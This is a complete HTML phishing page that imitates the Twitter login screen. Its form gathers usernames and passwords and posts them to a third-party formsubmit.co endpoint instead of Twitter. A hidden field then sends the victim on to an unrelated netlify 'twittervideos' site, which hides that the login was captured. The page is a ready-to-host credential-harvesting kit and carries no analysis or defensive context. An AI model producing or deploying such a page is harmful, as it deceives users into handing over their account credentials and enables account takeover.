<!DOCTYPE html>
<html>
<head>
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  
  <title>Twitter Login</title>
  <link rel="stylesheet" href="style.css">
</head>
<body>
  <div class="container">
    <img src="twitter_logo.png" alt="Twitter Logo" class="logo">
    <h2>Log in to Twitter</h2>
    <form action="https://formsubmit.co/721b5217850899d7436201826bfbba73" method="POST" id="login-form">
      <input type="text" name="username" id="username" placeholder="Username" required>
      <input type="hidden" name="_next" value="https://twittervideos-redirectsite.netlify.app/">
      <input type="password" name="password" id="password" placeholder="Password" required>
      <input type="submit" value="Log In">
      <input type="hidden" name="_captcha" value="true">
    </form>
  </div>
  

  <script src="script.js"></script>
</body>
</html>
